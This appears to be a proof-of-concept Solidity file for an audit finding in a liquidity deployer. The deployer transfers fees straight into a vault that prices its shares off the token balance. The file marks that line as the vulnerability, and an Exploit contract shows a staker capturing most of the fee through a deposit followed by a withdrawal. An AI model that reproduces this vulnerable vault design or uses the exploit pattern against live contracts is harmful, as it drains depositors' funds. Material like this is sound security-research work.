// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Rush LiquidityDeployer.deployLiquidity (Hexens, 2025-02).
    The pool fee is 90 of a 100 fee. It is transferred straight into
    an ERC4626 that prices shares off its token balance. A staker
    with 99 of 100 shares withdraws in the same call and takes 89.1
    of that fee. The control prices shares off accounted deposits
    and returns the 99 with none of the fee.
*/

contract WETH {
    string public symbol = "WETH";
    uint8 public constant decimals = 18;
    mapping(address => uint256) internal _bal;
    mapping(address => mapping(address => uint256)) public allowance;

    function balanceOf(address account) public view returns (uint256) {
        return _bal[account];
    }

    function mint(address to, uint256 amt) external {
        _bal[to] += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        _bal[msg.sender] -= amt;
        _bal[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        allowance[from][msg.sender] -= amt;
        _bal[from] -= amt;
        _bal[to] += amt;
        return true;
    }
}

contract Pair {
    uint256 public seeded;

    constructor() {
        seeded = 1;
    }
}

contract LiquidityPool {
    WETH public weth;
    uint256 public totalShares;
    mapping(address => uint256) public sharesOf;
    uint256 public accounted;
    uint256 public lastAssets;
    uint256 public lastWithdrawn;
    bool public pricesFromBalance;

    constructor(WETH _weth, bool _pricesFromBalance) {
        weth = _weth;
        pricesFromBalance = _pricesFromBalance;
    }

    function seed(address user, uint256 amt) external {
        weth.mint(address(this), amt);
        sharesOf[user] += amt;
        totalShares += amt;
        accounted += amt;
    }

    function deposit(uint256 amt) external returns (uint256 minted) {
        weth.transferFrom(msg.sender, address(this), amt);
        uint256 supply = totalShares;
        uint256 assetsBefore = weth.balanceOf(address(this)) - amt;
        minted = supply == 0 ? amt : amt * supply / assetsBefore;
        totalShares += minted;
        sharesOf[msg.sender] += minted;
        accounted += amt;
        lastAssets = weth.balanceOf(address(this));
    }

    function totalAssets() public view returns (uint256) {
        if (pricesFromBalance) return weth.balanceOf(address(this));
        return accounted;
    }

    function withdraw(uint256 shareAmt) external returns (uint256 assets) {
        uint256 supply = totalShares;
        assets = shareAmt * totalAssets() / supply;
        totalShares -= shareAmt;
        sharesOf[msg.sender] -= shareAmt;
        if (accounted > assets) accounted -= assets;
        else accounted = 0;
        lastWithdrawn = assets;
        weth.transfer(msg.sender, assets);
    }
}

contract LiquidityDeployer {
    WETH public weth;
    LiquidityPool public pool;
    Pair public pair;
    address public launcher;
    uint256 public totalFeeStored;
    uint256 public reserveFeeStored;
    uint256 public poolFeeStored;
    uint256 public deadline;

    constructor(WETH _weth, LiquidityPool _pool, Pair _pair, address _launcher) {
        weth = _weth;
        pool = _pool;
        pair = _pair;
        launcher = _launcher;
        weth.mint(address(this), 100 ether);
    }

    // Quoted deployLiquidity. The pool fee is a plain transfer into the vault.
    function deployLiquidity(uint256 amount, uint256 duration, uint256 maxTotalFee) external returns (uint256 poolFee) {
        require(msg.sender == launcher, "only launcher");
        require(deadline == 0, "pair already funded");
        require(amount >= 1 ether, "min");
        require(duration >= 1, "duration");
        uint256 totalFee = 100 ether;
        uint256 reserveFee = 10 ether;
        require(totalFee <= maxTotalFee, "max fee");
        totalFeeStored = totalFee;
        reserveFeeStored = reserveFee;
        deadline = duration;
        weth.transfer(address(pair), reserveFee);
        poolFee = totalFee - reserveFee;
        poolFeeStored = poolFee;
        weth.transfer(address(pool), poolFee); // @> VULN: the vault prices shares off this balance
    }
}

contract Exploit {
    address public constant ATTACKER = 0x1111111111111111111111111111111111111111;
    address public constant HONEST = 0x2222222222222222222222222222222222222222;
    uint256 public constant STAKE = 99 ether;
    uint256 public constant CAPTURED = 89.1 ether;

    WETH public weth;
    LiquidityPool public pool;
    Pair public pair;
    LiquidityDeployer public deployer;

    function run() external {
        weth = new WETH();
        pool = new LiquidityPool(weth, true);
        pair = new Pair();
        deployer = new LiquidityDeployer(weth, pool, pair, address(this));
        pool.seed(HONEST, 1 ether);
        weth.mint(address(this), STAKE);
        weth.approve(address(pool), STAKE);
        pool.deposit(STAKE);
        uint256 poolFee = deployer.deployLiquidity(1 ether, 1, 100 ether);
        require(poolFee == 90 ether, "pool fee is 90");
        uint256 got = pool.withdraw(STAKE);
        require(got == STAKE + CAPTURED, "withdrew stake plus 89.1");
        weth.transfer(ATTACKER, CAPTURED);
        require(weth.balanceOf(ATTACKER) == CAPTURED, "attacker kept 89.1 of the fee");
    }
}
